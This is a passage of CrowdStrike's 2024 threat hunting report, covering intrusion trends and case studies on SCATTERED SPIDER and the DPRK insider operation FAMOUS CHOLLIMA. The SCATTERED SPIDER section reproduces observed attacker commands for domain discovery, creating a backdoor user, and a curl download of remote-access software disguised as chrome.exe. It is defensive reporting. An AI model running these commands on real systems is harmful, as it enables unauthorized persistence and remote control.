2 0 2 4
THREA TH UNTINGREPOR T2
CROWDSTRIKE 2024 THREAT HUNTING REPORT
Table of 
Contents
Introduction
3
Naming Conventions
6
Front\-Line Snapshot
7
Sector Targeting
9
Sector Spotlights
10
Intrusion Trends by Adversary
12
Observations from the Front Lines
15
Hunting the Cross\-Domain Threat
15
Case Study: SCATTERED SPIDER Abuses Cloud 
Management Agent to Establish Persistence
16
Hunting the Insider Threat
18
Case Study: FAMOUS CHOLLIMA Insider Threats Target 
100\+ U.SBased Companies
19
Identity Hunting
22
Case Study: HORDE PANDA Activity
24
Cloud Hunting
26
Case Study: Adversaries Pivot Between Cloud Control 
Plane and Hosted VMs 
27
Case Study: Threat Actor Enumerates Cloud Account 
Information from Compromised VMs
28
Endpoint Hunting
31
Case Study: Hunting the STATIC KITTEN Adversary 
33
Countering the Adversary 
36
Case Study: Hunting PUNK SPIDER
37
Conclusion
39
About CrowdStrike
41
CROWDSTRIKE 2024 THREAT HUNTING REPORT3
Introduction
Stealth and speed were the dominant themes of the 2023 cyber threat 
landscape. Adversaries have faced a hardened attack surface due to 
advancements in threat defense technology and threat awareness. 
In response, they have increasingly adopted and relied on techniques 
that allow them to move faster and evade detection. 
CrowdStrike's Counter Adversary Operations team brings together 
industry\-leading threat intelligence and pioneering managed threat hunting 
with the AI\-powered CrowdStrike Falcon platform to detect, disrupt and stop 
todays sophisticated adversaries. Their efforts safeguard thousands of customers 
from the most sophisticated adversaries by providing the intelligence, threat 
hunting skills and resources that most organizations lack.
As adversaries adopt new tactics, the CrowdStrike OverWatch team does the 
same. Cross\-domain threat hunting has become essential as threat actors target 
multiple domains across an organization's infrastructure most notably identity, 
endpoint and cloud in their efforts to evade detection. These cross\-domain 
threats pose a challenge to threat hunters because they often generate fewer 
detections in a single domain or product, making the activity difficult to recognize 
as malicious. Adversaries that gain access continue to operate under the radar 
using legitimate remote monitoring and management (RMM) tools. As they strive 
to shrink their footprint and refine their attacks, CrowdStrike OverWatch works 
tirelessly to detect them with cross\-domain threat hunting.

THE 
CROWDSTRIKE 
2024 THREAT 
HUNTING 
REPORT 
HIGHLIGHTS 
THE 
TRENDS 
THE CROWDSTRIKE OVERWATCH 
TEAM HAS 
OBSERVED OVER 
THE 
PAST 
12 
MONTHS 
AND DETAILS 
HOW 
CROWDSTRIKE OVERWATCH 
UTILIZES 
PROACTIVE, 
INTELLIGENCE\-INFORMED 
THREAT 
HUNTING 
TO 
RELENTLESSLY 
TRACK, 
DETECT 
AND 
ULTIMATELY 
DISRUPT THE 
ADVERSARY 
NO 
MATTER 
WHEN OR 
WHERE 
THEY 
OPERATE. 
CROWDSTRIKE 2024 THREAT HUNTING REPORT4
The cross\-domain threat is increasing as adversaries attempt to infiltrate 
targets through human access, commonly known as insider threats. This year, 
CrowdStrike OverWatch identified individuals associated with the Democratic 
Peoples Republic of Korea (DPRK)\-nexus adversary FAMOUS CHOLLIMA applying to, 
or actively working at, more than 100 unique companies. This threat actor exploited 
the recruitment and onboarding processes to obtain physical access through 
legitimately provisioned systems, which were housed at intermediary locations. 
The adversary insiders remotely accessed these systems to log in to corporate 
VPNs posing as developers. This masquerade gave FAMOUS CHOLLIMA 
deeply enduring access to dozens of organizations and proved nearly impossible 
to detect without the benefit of CrowdStrike OverWatch threat hunting and the 
support of far\-reaching visibility provided by the Falcon platform.
In addition to conducting cross\-domain attacks, adversaries are developing greater 
expertise in moving seamlessly between platforms and using tools that are equally 
effective across operating systems. This rise in hybrid threats presents significant 
challenges to defenders across disciplines. DPRK\-nexus adversaries, for example, 
quickly navigate multiple platforms, build custom tooling and spontaneously 
pivot actions on objectives highlighting the need for fast, proactive and 
intelligence\-driven hunting to stay one step ahead of the threat actors. 
Identity\-based detections are particularly important, as they can identify 
suspicious activity on unmanaged hosts and supplement traditional endpoint 
detection and response (EDR) events. Consistent with last year, threat actors 
increasingly use identity\-based attacks to gain initial access. Using CrowdStrike 
Falcon Identity Protection, CrowdStrike OverWatch threat hunters continued 
to expand their hunting mission and routinely countered persistent adversaries 
that employ identity attacks, including formidable threat actors like China\-nexus 
HORDE PANDA.
Adversaries are also increasingly pivoting to cloud environments, with a noted 
75% increase in 2023, as stated in the CrowdStrike 2024 Global Threat Report. 
While many threat actors employ basic techniques, others such as prolific eCrime 
adversary SCATTERED SPIDER and Russia\-nexus adversary COZY BEAR evolve 
quickly, and proactive hunters must stay one step ahead in the cloud. CrowdStrike 
OverWatch keeps pace with these adversaries by developing innovative hunting 
techniques for cloud services, workloads and control planes as well as using 
advances in CrowdStrike's identity protection module. 
While threat hunters faced many new challenges in the past 12 months, 
long\-standing endpoint threats did not abate. Adversaries continued to leverage 
a seemingly endless list of RMM tools, which are appealing due to their wide 
availability and their use as legitimate solutions in many organizations. eCrime 
and targeted intrusion adversaries alike continue to rely on RMM tooling. 
Examples include eCrime adversary CHEF SPIDER and Iran\-nexus adversary 
STATIC KITTEN, which both used phishing campaigns delivering RMM tools 
to create an effective initial access beachhead.5
CROWDSTRIKE 2024 THREAT HUNTING REPORT
Speed, accuracy and threat intelligence are integral components to countering the 
adversary through proactive hunting. This year, in the MITRE Engenuity ATT\&CK 
Evaluations: Managed Services, Round 2, detection\-only test, CrowdStrike 
delivered comprehensive detection coverage and rapid mean time to detect 
(MTTD) at an impressive four minutes.
Over the past 12 months, CrowdStrike OverWatch threat hunters distilled their 
findings into hundreds of new behavior\-based preventions. As a result, the teams 
front\-line findings directly augment the Falcon platforms ability to detect and 
prevent the latest threats. In the past year alone, these new behavior\-based 
detections have enabled the Falcon platform to prevent an additional 2\.4 million 
malicious events that would have otherwise evaded autonomous detection 
methods amounting to approximately 4\.6 preventions per minute.
The CrowdStrike 2024 Threat Hunting Report presents trends identified from 
July 1, 2023, to June 30, 2024, exposed by proactive, intelligence\-informed threat 
hunting. Year\-over\-year, CrowdStrike OverWatch observed the following:
Interactive intrusions increased by 55%. An interactive intrusion 
occurs when threat actors perform hands\-on\-keyboard activities within 
a victim's environment.
86% of all interactive intrusions were attributed to eCrime activity.
eCrime\-related interactive intrusions against the healthcare sector 
increased 75%.
Interactive intrusions impacting the technology sector increased 60%, 
making technology the most frequently targeted industry for the seventh 
consecutive year.
FAMOUS CHOLLIMA insiders were identified applying to or actively 
working at more than 100 unique companies.
Adversary use of RMM tools increased 70%, and 27% of all interactive 
intrusions leveraged RMM tools.
This report represents the Counter Adversary Operations teams relentless 
efforts to disrupt the adversary. Behind every CrowdStrike threat hunter is the 
power of a unified security solution, empowering hunters with the richest security 
telemetry encompassing endpoint, identity and cloud workloads as well as 
intelligence to find and stop adversaries in their tracks.6
CROWDSTRIKE 2024 THREAT HUNTING REPORT
NAMING CONVENTIONS
Adversary
Nation\-State or Category
BEAR
RUSSIA
BUFFALO
VIETNAM
CHOLLIMA
DPRK (NORTH KOREA)
CRANE
ROK (REPUBLIC OF KOREA)
HAWK
SYRIA
JACKAL
HACKTIVIST
KITTEN
IRAN
LEOPARD
PAKISTAN
LYNX
GEORGIA
OCELOT
COLOMBIA
PANDA
SAIGA
PEOPLES REPUBLIC OF CHINA
KAZAKHSTAN
SPIDER
eCRIME
TIGER
INDIA
WOLF
SPHINX
TURKEY
EGYPT
CROWDSTRIKE 2024 THREAT HUNTING REPORT7
Front\-Line 
Snapshot
The statistics provided in this report reflect insights from the 
CrowdStrike OverWatch threat hunting team from July 1, 2023, 
through June 30, 2024\. This data specifically focuses on 
interactive intrusions attacks where adversaries establish 
an active presence within a target network, often engaging in 
hands\-on\-keyboard activities to achieve their objectives. 
Unlike automated attacks, interactive intrusions involve human 
operators who interact with systems in real time, adapting their 
tactics as needed. Interactive intrusions are typically more 
sophisticated and difficult to detect compared to automated 
attacks, requiring advanced threat hunting and incident 
response capabilities to identify and mitigate.
Interactive intrusions are characterized by:
Manual Intervention: Attackers manually navigate the network, 
leveraging their skills and knowledge to bypass security controls.
Persistence: Attackers establish and maintain long\-term access to 
the network, often using advanced techniques to evade detection.
Lateral Movement: After gaining initial access, attackers move laterally 
across the network to identify and compromise additional systems.
Data Exfiltration: The primary goal is often to steal sensitive data, 
intellectual property or credentials.
Customization: Attackers tailor their techniques to the specific 
environment and defenses of the target organization.
Over the past 12 months, CrowdStrike OverWatch observed interactive 
intrusions continue to climb, increasing 55% year\-over\-year. The overall 
distribution of interactive intrusion activity by threat type saw a noted 
increase in activity by eCrime adversaries 86% of the total volume 
was associated with eCrime highlighting the increased threat posed by 
criminal threat actors seeking financial gain. These observations underscore 
the persistent and pervasive threat of eCrime adversaries as well as 
CrowdStrike OverWatchs ability to quickly identify and uncover them.

INTERACTIVE 
INTRUSIONS 
ARE 
TYPICALLY 
MORE 
SOPHISTICATED 
AND 
DIFFICULT 
TO 
DETECT 
COMPARED 
TO 
AUTOMATED 
ATTACKS, 
REQUIRING 
ADVANCED 
THREAT 
HUNTING 
AND 
INCIDENT 
RESPONSE 
CAPABILITIES 
TO 
IDENTIFY 
AND 
MITIGATE.8
CROWDSTRIKE 2024 THREAT HUNTING REPORT
Figure 1\. Interactive intrusion breakdown
Interactive Intrusions Over Time \| Q3 2022\-Q2 2024
Interactive Intrusions by Motivation 
Q3 2023\-Q2 2024
Top Verticals by Intrusion Frequency 
Q3 2023\-Q2 2024
TECHNOLOGY
CONSULTING AND PROFESSIONAL SERVICES
FINANCIAL SERVICES
HEALTHCARE
RETAIL
MANUFACTURING
TELECOMMUNICATIONS
TARGETED 
INTRUSIONS
eCRIME
GOVERNMENT
INDUSTRIALS AND ENGINEERING
ACADEMIC
14%
86%
60%
58%
25%
70%
55%
57%
42%
84%
93%
2%
102%
82%
52%
141%
109%
160%
44%
41%
75%
36%
43%
51%
60%
7%
94%9
CROWDSTRIKE 2024 THREAT HUNTING REPORT
SECTOR TARGETING
For the reporting period, interactive intrusions impacting technology entities increased 60% year\-over\-year, 
making technology the most frequently targeted industry for the seventh consecutive year. The technology 
sector encompasses a broad range of organizations that develop computer software and hardware or provide 
IT services or technology. Due to its relationship to many other verticals, the technology sector is a high\-value 
target for both targeted intrusion and eCrime adversaries. 
Figure 2\. Targeted sectors by intrusion frequency, July 2022\-June 2023 vs. July 2023\-June 2024
Top Sectors by Intrusion Frequency
T
argeted Intrusion
eCrime
TECHNOLOGY
CONSULTING AND 
PROFESSIONAL SERVICES
FINANCIAL SERVICES
HEALTHCARE
RETAIL
MANUFACTURING
TELECOMMUNICATIONS
GOVERNMENT
INDUSTRIALS AND 
ENGINEERING
ACADEMIC
REAL ESTATE
MEDIA
ENERGY
HOSPITALITY
UTILITIES
TECHNOLOGY
TECHNOLOGY
TELECOMMUNICATIONS
CONSULTING AND 
PROFESSIONAL SERVICES
CONSULTING AND 
PROFESSIONAL SERVICES
HEALTHCARE
FINANCIAL 
SERVICES
RETAIL
GOVERNMENT
MANUFACTURING
JULY 2022\-JUNE 2023
JULY 2023\-JUNE 2024
VS.10
CROWDSTRIKE 2024 THREAT HUNTING REPORT
SECTOR
SPOTLIGHTSHealthcare
While technology entities remain attractive targets for various adversaries, 
eCrime\-related interactive intrusions against healthcare entities increased 75% 
over the prior 12 months. The healthcare sector includes a large variety of entities 
that possess patients protected health information (PHI), financial information 
(such as credit card and bank account numbers) and personally identifiable 
information (PII), making these entities a prime target for eCrime threat actors.
Big game hunting (BGH) adversaries which remain the primary threat to all 
sectors, including healthcare use data theft, extortion and ransomware to 
pressure victims into paying a ransom. Access brokers threat actors that acquire 
access to organizations and provide or sell this access to other actors and 
commodity services also continue to threaten the healthcare sector by facilitating 
the financially motivated operations of other eCrime threat actors. To evidence 
this threat, access broker advertisements for healthcare entities increased 
142% compared to the previous 12 months. 
Consulting and Professional Services
Targeted intrusion activity targeting the consulting and professional services 
vertical increased by 141% year\-over\-year, moving this vertical up to second place 
in overall sector targeting trends and displacing both financial services and retail. 
The consulting and professional services sector provides specialist services 
andor consultancy and is staffed by employees with specific skill sets or training. 
This sector includes human resources, architectural, recruitment agency, 
consultancy and marketing services. Consulting and professional services 
entities possess a significant amount of sensitive information including 
financial and personal data, strategic plans and trade secrets that makes 
these entities increasingly attractive for targeted intrusion adversaries. 
Given the sectors supporting nature, targeted intrusion adversaries can also 
target entities in this sector to gain access to additional downstream victims. 
The consulting and professional services sector is becoming a popular target for 
various eCrime adversaries, including BGH threat actors and access brokers, as 
entities within this sector present numerous opportunities for these threat actors 
to profit financially. To evidence this threat, access broker advertisements for 
consulting and professional services entities increased 152% year\-over\-year. 
11
CROWDSTRIKE 2024 THREAT HUNTING REPORT
MITRE ATT\&CK Observations
CrowdStrike OverWatch tracks interactive intrusion activity against the MITRE ATT\&CK Enterprise Matrix, 
a framework that categorizes and tracks adversary behavior.1
This heat map illustrates the top MITRE techniques and tactics CrowdStrike OverWatch detected in interactive 
intrusion activity over the past 12 months. CrowdStrike OverWatch tirelessly hunts for post\-exploitation
behaviors no matter the initial access vector, adversaries are detected very quickly. As a result, CrowdStrike 
OverWatch most often observes techniques within the Discovery tactic, when adversaries are still orienting 
themselves in a network.
1 
MITRE ATT\&CK and ATT\&CK are registered trademarks of The MITRE Corporation. To learn more about MITRE ATT\&CK,
visit https:attack.mitre.orgmatricesenterprise.
Figure 3\. MITRE ATT\&CK heat map highlighting top techniques CrowdStrike OverWatch observed adversaries 
employ in each tactic area, July 2023\-June 2024
Initial Access
Execution
Persistence
Privilege Escalation
Exploit Public\-Facing 
Application
Command and Scripting 
Interpreter
Scheduled TaskJob
Process Injection
Valid Accounts
Windows Management 
Instrumentation
Valid Accounts
Scheduled TaskJob
Shared Modules
Create Account
Abuse Elevation Control 
Mechanism
Exploitation for Client 
Execution
Defense Evasion
Credential Access
Discovery
Lateral Movement
Masquerading
OS Credential Dumping
Account Discovery
Remote Desktop 
Protocol
Disable or Modify Tools
Unsecured Credentials
System OwnerUser 
Discovery
Remote Services
Modify Registry
Brute Force
System Network 
Configuration Discovery
SMBWindows Admin 
Shares
Process Injection
Credentials In Files
System Information 
Discovery
Obfuscated Files or 
Information
Remote System 
Discovery
Indicator Removal
Permission Groups 
Discovery
Indirect Command Execution
Network Service 
Discovery
Valid Accounts
Security Software 
Discovery
Rundll32
Network Share 
Discovery
Timestomp
Domain Groups
File and Directory 
Permissions Modification
File and Directory 
Discovery
DeobfuscateDecode 
Files or Information
Abuse Elevation Control 
Mechanism
Collection
Command and Control
Exfiltration
Impact
Archive Collected Data
Ingress Tool Transfer
Data Encrypted for 
Impact
Remote Access
Software
Inhibit System Recovery
Web Service
Application Layer 
Protocol
Proxy
CROWDSTRIKE 2024 THREAT HUNTING REPORT12
Use of MITRE ATT\&CK techniques involving identity increased across 
all stages of adversary operations. Discovery techniques remain the most 
prominent category half of the top 10 techniques observed in the past 12 
months fall into this category. This is unsurprising, as eCrime access brokers 
rely on these techniques including Account Discovery, System Network 
Configuration Discovery and Remote System Discovery to evaluate targets as 
part of the threat actors efforts to monetize operations. OS Credential Dumping 
and Account Discovery are often interconnected, as adversaries continue to 
compromise valid identities to access networks. 
Adversaries are increasingly leveraging RMM tools, and Ingress Tool Transfer and 
Masquerading remained two of the top MITRE tactics. As organizations become 
increasingly aware of RMM threats, adversaries such as STATIC KITTEN have 
begun to rename these tools to obfuscate their efforts.
Unsurprisingly, Disabling and Modifying Tools to Impair Defenses was a 
commonly observed technique. As EDR and extended detection and response 
(XDR) platforms such as the Falcon platform grow more sophisticated, 
adversary attacks are more frequently disrupted. Over the past 12 months, 
many adversaries have advertised custom tooling that allegedly uncovers EDR 
products. Though these tools are often ineffective, adversaries are increasingly 
interested in them. As this threat evolves and adversaries attempt to circumvent 
security controls, human\-driven threat hunting teams such as CrowdStrike 
OverWatch are a vital line of defense. 
INTRUSION TRENDS
BY ADVERSARYCrowdStrike is a pioneer in adversary profiling and attribution. With detailed 
information into 245\+ attributed eCrime, targeted intrusion and hacktivist 
adversaries and more than 140 active clusters of malicious activity that have 
not yet met CrowdStrikes standards for adversary graduation CrowdStrike 
OverWatch threat hunters are well positioned to quickly and accurately disrupt 
the adversary. The following image highlights the most prevalent adversary 
operations identified over the past 12 months.13
CROWDSTRIKE 2024 THREAT HUNTING REPORT
Figure 4\. Interactive adversary disruptions across the world, July 2023\-June 2024
North America
South America
Middle East
South Asia
East Asia
Oceania
Southeast Asia
PUNK 
SPIDER
VICE 
SPIDER
BITWISE 
SPIDER
PUNK 
SPIDER
ETHEREAL 
PANDA
VICE 
SPIDER
PUNK 
SPIDER
SCATTERED 
SPIDER
BITWISE 
SPIDER
PULSAR 
KITTEN
BITWISE 
SPIDER
BITWISE 
SPIDER
AQUATIC 
PANDA
FAMOUS 
CHOLLIMA
LABYRINTH 
CHOLLIMA
JACKPOT 
PANDA
HORDE 
PANDA
WANDERING 
SPIDER
FANCY 
BEAR
BITWISE 
SPIDER
BITWISE 
SPIDER
SILENT 
CHOLLIMA
BITWISE 
SPIDER
BITWISE 
SPIDER
WANDERING 
SPIDER
VICE 
SPIDER
TECHNOLOGY
MANUFACTURING
SERVICES\*
REAL ESTATE
TECHNOLOGY
GOODS\*
AUTOMOTIVE
FINANCIAL
LOGISTICS
REAL 
ESTATE
RETAIL
HEALTHCARE
FINANCIAL
FINANCIAL
FINANCIAL
COMPUTER 
GAMING
TELECOM
MANUFACTURING
AEROSPACE
ENERGY
HOSPITALITY
UTILITIES
MANUFACTURING
AGRICULTURE
SERVICES\*
MANUFACTURING
SERVICES\*
FINANCIAL
SERVICES\*
REAL ESTATE
HEALTHCARE
SERVICES\*
GOVERNMENT
TECHNOLOGY
INDUSTRIAL
TECHNOLOGY
SERVICES\*
TECHNOLOGY
SERVICES\*
HOSPITALITY
TECHNOLOGY
TECHNOLOGY
SERVICES\*
TECHNOLOGY
FINANCIAL
ENERGY
INDUSTRIAL
MANUFACTURING
HEALTHCARE
TECHNOLOGY
ACADEMIC
RETAIL
ACADEMIC
GOODS\*
MANUFACTURING
GOVERNMENT
RETAIL
TELECOM
ENERGY
GOVERNMENT
EXTRACTIVE
INDUSTRIALS
MANUFACTURING
FINANCIAL
HEALTHCARE
EXTRACTIVE
RETAIL
Western Europe
Southern Europe
\*SERVICES \= CONSULTING AND PROFESSIONAL SERVICES
\*GOODS \= CONSUMER GOODS
CROWDSTRIKE 2024 THREAT HUNTING REPORT14
eCrime adversaries are the most prevalent type of threat actors that CrowdStrike 
OverWatch threat hunters disrupt; these adversaries are prolific and often 
opportunistic. In many instances, CrowdStrike OverWatch detects targeted 
intrusion adversary activity early in the kill chain before it reaches an interactive 
stage. For example:
The Falcon sensor prevented PRIMITIVE BEARs initial access attempts, which 
involved spear\-phishing and a weaponized USB, before the adversary could 
gain interactive access. CrowdStrike OverWatchs specific insights were turned 
into sensor\-level detections.
China\-nexus adversaries are increasingly attempting access via stealthy 
implants and .NET execution through compromised Internet Information 
Services (IIS) servers. In response, CrowdStrike OverWatch threat hunters 
worked with CrowdStrikes engineering teams to ensure that this entry point 
has increased visibility. By honing hunting leads that focus on reflective .NET 
loading and IIS compromise, CrowdStrike OverWatch prevented China\-nexus 
adversaries from achieving initial access or from moving laterally in a network.Over the last 12 months, CrowdStrike OverWatch continued to observe adversaries 
leverage speed and stealth across the landscape to minimize their footprints and 
increase their chances of evading automated detections. As defenses harden, 
adversaries evolve their tactics to hide within normal network activity. 
The good news is that CrowdStrike OverWatch hunters work 247, 365 days a year 
to stop them. Human expertise and threat hunting are crucial for distinguishing 
between real threats and normal activity without generating false positives that 
distract security teams. CrowdStrikes elite threat hunters rapidly identify stealthy 
attacks and adversary tactics, feeding these new detections into the AI\-powered 
Falcon platform. This virtuous cycle enhances the Falcon platform and strengthens 
defenses for all CrowdStrike customers.
CROWDSTRIKE 2024 THREAT HUNTING REPORT15
Observations 
from the 
Front Lines
HUNTING THE
CROSS\-DOMAIN THREATCross\-domain threat hunting refers to CrowdStrike OverWatchs ability to 
identify adversary behavior even when it takes place across several domains 
of an organization's security structure, notably identity, endpoint and cloud. 
Attacks that take place across multiple domains pose a significant challenge 
because they often generate fewer detections in any single domain or product. 
This dispersed footprint makes intrusion activity difficult to successfully 
recognize as being malicious, as it can appear to take place in isolation or 
without correlating detections.
By combining data and detections from multiple domains and leveraging that 
against CrowdStrikes threat intelligence, CrowdStrike OverWatch is uniquely 
situated to respond to threats that cross these domain barriers.
Cross\-domain intrusions can vary significantly in complexity, but CrowdStrike 
commonly sees adversaries moving either back and forth between the endpoint 
and identity planes or from the cloud to an endpoint. 
The latter is a particularly dangerous and increasingly prevalent occurrence that 
is enabled by improvements in phishing and the spread of infostealers.
If adversaries can find or steal credentials, they can gain direct access to 
poorly configured cloud environments, bypassing the need to compromise 
heavily defended endpoints. From this vantage point, they are then able to 
find over\-privileged users and roles to further compromise cloud environments 
or use their access to descend into endpoint environments. With this access, 
they can deploy remote management tools instead of malware, making these 
attacks challenging to disrupt. 
One of the most proficient and prolific adversaries capable of cross\-domain 
attacks is SCATTERED SPIDER. Throughout 2023 and 2024, SCATTERED 
SPIDER demonstrated sophisticated cross\-domain tradecraft within targeted 
cloud environments, often leveraging spear\-phishing, policy modification and 
access to password managers to gain access, maintain persistence, move 
laterally and exfiltrate data. 
CROWDSTRIKE 2024 THREAT HUNTING REPORT16
 CASE STUDY: 
SCATTERED SPIDER Abuses 
Cloud Management Agent 
to Establish Persistence
In May 2024, CrowdStrike OverWatch observed SCATTERED SPIDER establish 
a foothold on a cloud\-hosted virtual machine (VM) instance via a cloud service 
VM management agent. To do so, the adversary compromised existing credentials 
to authenticate to the cloud control plane via an identified phishing campaign. 
After authenticating to the cloud console, the adversary established persistence 
by executing commands on the cloud\-hosted VM via the management agent.
After establishing an initial connection, SCATTERED SPIDER executed the 
ping command against several domains within and outside of the target 
organization, likely to identify their level of access and visibility within the 
network. The adversary then ran several variations of the nltest command 
to identify domain controllers (DCs) of interest and the wmic command to 
identify programs currently installed on the host.
Finally, the adversary established persistence by creating a new user on the host 
and attempting to download FleetDeck remote access software.
nltest dclist:
nltest domain\_trusts
wmic product get name, version
net user \[Redacted\-Username] \[Redacted\-Password]
curl \-L hxxps:agent.fleetdeck\[.]io
M9zydGyGHrUXkhZeB9mj4?win \-o chrome.exe17
CROWDSTRIKE 2024 THREAT HUNTING REPORT17
This attack took place across three operating domains: email, then cloud 
management, then within a VM. Because of this, the detectable footprint of this 
activity in any single detection domain was very low and difficult to conclusively 
signature. Quickly identifying such an attack relied on leveraging knowledge 
about SCATTERED SPIDER from CrowdStrikes extensive threat intelligence and 
prior experience, combining this knowledge with telemetry from the control 
plane and correlating this information against detections from within the virtual 
machine to successfully recognize an intrusion underway.
Many adversaries are honing their cross\-domain proficiency, and an increasing 
number are attempting to develop capabilities that expand to multiple security 
domains. Such adversaries can quickly and confidently navigate multiple 
operating systems and security platforms. Whether the adversary is leveraging 
native applications or cross\-platform custom tools, threat hunters must be 
flexible and quickly adapt to any target environment.

QUICKLY IDENTIFYING 
SUCH AN ATTACK RELIED ON 
LEVERAGING KNOWLEDGE ABOUT 
SCATTERED SPIDER FROM 
CROWDSTRIKES EXTENSIVE 
THREAT INTELLIGENCE AND 
PRIOR EXPERIENCE.
Figure 5\. SCATTERED SPIDER cross\-domain attack
SCATTERED SPIDER 
Cross\-Domain Attack
IDENTITY 
Conducted a 
phishing campaign 
to obtain valid 
credentials
CLOUD 
Leveraged 
the credentials 
to authenticate 
to the cloud 
control plane
CLOUD 
Established a foothold 
on a cloud\-hosted VM 
via a cloud service 
VM management agent, 
which took commands 
from the cloud control 
plane and ran them on 
the instance under 
the agent process
ENDPOINT 
Established 
persistence by 
creating a new user 
and downloading 
FleetDeck
CROWDSTRIKE 2024 THREAT HUNTING REPORT18
HUNTING THE
INSIDER THREATCrowdStrike OverWatch hunters are continually faced with new challenges 
as adversaries increasingly seek stealthy and creative avenues for initial 
access. In addition to leveraging cross\-domain attacks, adversaries are 
becoming more platform\-agnostic, moving seamlessly between platforms 
with tooling and capabilities that are equally effective for Windows, macOS 
and Linux. In some cases, the adversarys motivations have become 
cross\-mission, blending traditional espionage goals with opportunistic 
currency generation. No adversaries exemplify this hybrid threat better 
than DPRK\-nexus adversaries. 
Hunting hybrid threats can present a significant challenge, given the ease 
and speed with which these adversaries adjust their tactics, tools, targets 
and in some cases primary goals. Countering these adversaries requires 
constant awareness of their behavioral and operational shifts, an area where 
intelligence\-driven hunting becomes a necessity. 
Though DPRK adversaries in general exemplify the hybrid threat, the adversary 
FAMOUS CHOLLIMA presented a unique challenge to CrowdStrike OverWatch 
hunters over the past year: hunting the adversary when they become the 
insider threat. 
FAMOUS CHOLLIMA operations are similar to other DPRK\-nexus adversaries 
in that this adversary will leverage recruitment\-themed lures, abuse malicious 
NPM and Node.js packages, deploy custom tooling known as BeaverTail and 
InvisibleFerret, and focus heavily on financial and technology entities. One key 
differentiator is that this adversary has also been involved in insider threat 
operations involving a network of malicious insiders who infiltrate corporate 
environments under the guise of legitimate employment. 
FAMOUS CHOLLIMA carried out these operations by obtaining contract or 
full\-time equivalent employment, using falsified or stolen identity documents 
to bypass background checks. When applying for a job, these malicious insiders 
submitted a rsum typically listing previous employment with a prominent 
company as well as additional lesser\-known companies and no employment 
gaps. In most cases, these insiders appeared financially motivated 
however, in a limited number of incidents, the threat actors exfiltrated 
sensitive information.
CROWDSTRIKE 2024 THREAT HUNTING REPORT19
Figure 6\. Hunting FAMOUS CHOLLIMA insider threat operations
Hunting FAMOUS CHOLLIMA 
Insider Threat Operations
Looking for Network Communications 
Hunting for abnormal source IP ranges
Disrupting the Adversary 
Validating and alerting suspicious activity with victims
Strengthening Detections 
Creating new detections and preventions for the Falcon platform
Hunting for RMM 
\> RustDesk 
\> AnyDesk 
\> TinyPilot 
\> VS Code Dev Tunnels 
\> Google Chrome Remote Desktop
Validating with CrowdStrike 
Falcon Identity Protection 
Comparing and validating expected behaviors 
for a known role with non\-expected behaviorsCASE 
STUDY: 
FAMOUS CHOLLIMA Insider Threats 
T
arget 100\+ U.SBased Companies
In April 2024, CrowdStrike Services responded to the first of several incidents in which FAMOUS CHOLLIMA 
malicious insiders targeted more than 30 U.Sbased companies, including aerospace, defense, retail and 
technology organizations. The malicious insiders claimed to be U.S. residents and were hired in early 2023 for 
multiple remote IT positions. 
Leveraging information from a single incident, CrowdStrike OverWatch quickly developed a scalable plan to hunt 
for this emerging insider threat and discovered more than 30 additional affected customers within two days. 
Threat hunters found that after obtaining employee\-level access to victim networks, the insiders performed 
minimal tasks related to their job role. In some cases, the insiders also attempted to exfiltrate data using Git, 
SharePoint and OneDrive. Additionally, the insiders installed the following RMM tools: RustDesk, AnyDesk, 
TinyPilot, VS Code Dev Tunnels and Google Chrome Remote Desktop.
The insiders then leveraged these RMM tools in tandem with company network credentials, which allowed 
numerous IP addresses to connect to the victims system.20
CROWDSTRIKE 2024 THREAT HUNTING REPORT
CrowdStrike OverWatch hunters searched for RMM tooling paired with 
suspicious network connections to systems. Combining these instances with 
information from the CrowdStrike Falcon Identity Protection module uncovered 
additional data, which allowed threat hunters to identify additional personas. 
CrowdStrike OverWatch leveraged Falcon Identity Protection to closely 
compare unexpected behaviors with expected behaviors for a known role 
within a company or network. Falcon Identity Protection provided context 
and data to enable hunters to identify suspicious actions. 
CrowdStrikes intelligence reporting enabled threat hunters to quickly identify 
additional indicators of compromise (IOCs), personas and techniques as 
well as uncover additional victim companies. CrowdStrike OverWatch then 
contacted likely victimized companies to inform them about potential insider 
threats and quickly corroborated CrowdStrikes findings with the victim 
companies. By leveraging the findings from these companies, CrowdStrike 
Counter Adversary Operations built a cohesive picture from disparate pieces 
and coordinated with law enforcement entities. 
As the Counter Adversary Operations team and CrowdStrike Services 
continued to investigate victimized companies and as insights into FAMOUS 
CHOLLIMAs operations grew CrowdStrike OverWatch developed more than 
20 hunting leads by combining EDR and identity data to identify malicious 
activity or suspect behavior.
In some cases, threat hunters identified suspicious activity that overlapped 
with a larger investigation into an operation that industry sources refer to 
as DPRK IT Workers, and CrowdStrike OverWatch notified these victim 
organizations within days of the insiders obtaining employment and 
subsequently gaining access to the organizations' networks.
Over the course of this investigation, CrowdStrike identified FAMOUS 
CHOLLIMA insiders applying to or actively working at more than 100 unique 
companies, most of which were U.Sbased technology entities.
In mid\-2024, the U.S. Department of Justice (DOJ) indicted several individuals 
who allegedly participated in this scheme, which according to the 
indictment likely enabled North Korean nationals to raise money for the 
DPRK government and its weapons programs.2
2 
U.S. Department of Justice, Charges and Seizures Brought in Fraud Scheme, 
Aimed at Denying Revenue for Workers Associated with North Korea, May 16, 2024: 
www.justice.govopaprcharges\-and\-seizures\-brought\-fraud\-scheme\-aimed\-denying\-revenue\-
workers\-associated\-north; Federal Bureau of Investigation (FBI), Democratic People's Republic 
of Korea Leverages U.SBased Individuals to Defraud U.S. Businesses and Generate Revenue, 
May 16, 2024: https:www.ic3\.govMediaY2024PSA24051621
CROWDSTRIKE 2024 THREAT HUNTING REPORT
The FAMOUS CHOLLIMA case exemplifies the speed and ingenuity of CrowdStrike OverWatch hunters when 
faced with a new challenge. Following proven methodologies, threat hunters quickly and effectively responded 
to an emerging threat and uncovered key insights that were quickly shared with CrowdStrike Counter Adversary 
Operations, CrowdStrike Falcon Identity Protection, CrowdStrike Services and CrowdStrike Falcon Complete 
creating a unified solution to a hybrid threat.
Figure 7\. FAMOUS CHOLLIMA targets observed by CrowdStrike OverWatch, July 2023\-June 2024
TECHNOLOGY
MEDIA
SOCIAL 
MEDIA
PHARMACEUTICAL
INSURANCE
MANUFACTURING
TRANSPORTATION
RETAIL
PROFESSIONAL 
SERVICES
FINANCIAL
FINTECH
FRANCE
PHILIPPINES
UKRAINE
BRAZIL
ARGENTINA
IRELAND
INDIA
SINGAPORE
AUSTRALIA
VIETNAM
HONG KONG
CYPRUS
SOUTH AFRICA 
TURKEY
BANGLADESH
US
